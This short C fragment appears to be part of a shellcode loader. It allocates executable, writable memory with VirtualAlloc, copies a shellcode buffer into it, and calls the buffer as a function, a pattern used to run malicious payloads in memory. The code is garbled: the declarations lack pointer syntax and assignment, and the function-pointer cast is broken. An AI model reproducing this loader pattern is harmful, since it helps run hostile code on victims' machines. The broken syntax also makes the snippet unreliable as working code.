// Allocate Virtual Memory 
void exec VirtualAlloc(0, sizeof code, MEM_COMMIT, PAGE_EXECUTE_READWRITE);


// Copy shellcode into allocated memory 
memcpy(exec, code, sizeof code);


// Execute shellcode in memory 
((void exec ();
return 0;
	
}